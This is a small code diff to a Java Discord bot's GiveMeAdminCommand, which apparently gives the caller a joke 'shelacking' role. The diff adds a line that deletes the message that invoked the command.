@@ -64,6 +64,8 @@ public class GiveMeAdminCommand implements ICommand {
             event.getGuild().addRoleToMember(event.getMember(), event.getGuild().getRolesByName("shelacking", true).get(0)).queueAfter(3, TimeUnit.SECONDS);
         }
 
+        event.getMessage().delete().queue();
+
     }
 
     @Override
